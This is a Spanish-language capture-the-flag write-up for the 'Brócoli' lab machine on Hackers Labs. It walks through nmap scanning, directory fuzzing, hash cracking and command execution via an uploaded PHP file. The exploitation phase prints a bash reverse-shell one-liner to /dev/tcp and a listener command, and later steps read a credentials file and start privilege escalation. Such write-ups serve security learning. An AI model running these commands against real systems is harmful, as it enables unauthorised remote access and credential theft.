# Solutions-de-CTF
**Machines Brocoli**


<img width="586" height="268" alt="image" src="https://github.com/user-attachments/assets/38a6a502-5624-4297-b4e9-832fb58fcb93" />



**Máquina:** Brócoli

**Plataforma:** Hackers Labs

**Dificultad:** Fácil – Intermedia (dependiendo tu experiencia)

**Categoría:** Web / Enumeración / Escalada de privilegios


**Fase 1: Reconocimiento**


En esta etapa se identifican los servicios expuestos en la máquina.


# Bash 

- nmap -sn < Ip >/24   

- nmap -sSCV -vvv -n -Pn --open --min-rate=5000 192.168.10.34   

<img width="658" height="298" alt="image" src="https://github.com/user-attachments/assets/75fda72b-ddfd-433b-828a-50fc6d7a8506" />




**Fase 2: Enumeración Web**


- Browser < IP >

- Codigo  // YXF1aW5vaGF5bmFkYSBwZWxvYnJvY29saQo=

  
# Bash

 echo 'YXF1aW5vaGF5bmFkYSBwZWxvYnJvY29saQo=' | base64 -d


 # Fuzzing Directorios

gobuster dir -u http://192.168.10.34/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php, txt, htlm

<img width="663" height="356" alt="image" src="https://github.com/user-attachments/assets/43ef64e8-6c0b-4a4b-aa49-dba8866f377c" />


- Browser < IP >/uploads/


<img width="500" height="249" alt="image" src="https://github.com/user-attachments/assets/8251d28e-baa8-4d5a-99c3-1ad3894c560f" />


- Click informebrocoli.txt

- MD5 913026c7754df0fbdc89b75007ad5a66

- Crackstations decifrar codigo (mecmec)


**Fase 2: Explotación**

- Shell Inversa
  Reverse Shell bash -i >& /dev/tcp/IP/443 0>&1
  Burpsuit Decoder e Encoder URL

- Browser http://ip/uploads/brocoli.php?cmd=encoder-------

# Bash 
nx -nlvp 443 

<img width="560" height="122" alt="image" src="https://github.com/user-attachments/assets/9f37813d-62b0-4d6c-8a25-03e828111dc2" />


# Credenciales en /opt

# Bash

cd /opt

ls -la

<img width="505" height="158" alt="image" src="https://github.com/user-attachments/assets/967d2b52-88af-411b-b124-6827e901514e" />

  
# Bash

cat credenciales.txt


<img width="563" height="198" alt="image" src="https://github.com/user-attachments/assets/36d7d321-9a46-4664-a0f5-3de9cd5e61af" />


# Bash 

su brocoli
usuario y password

<img width="552" height="84" alt="image" src="https://github.com/user-attachments/assets/d74bcf07-6c94-49b7-bccc-b2fa234ae314" />


# Escala de privilegios

# Bash 

sudo -l 

<img width="568" height="190" alt="image" src="https://github.com/user-attachments/assets/2d394436-442c-4721-8562-9b1931fc85d6" />


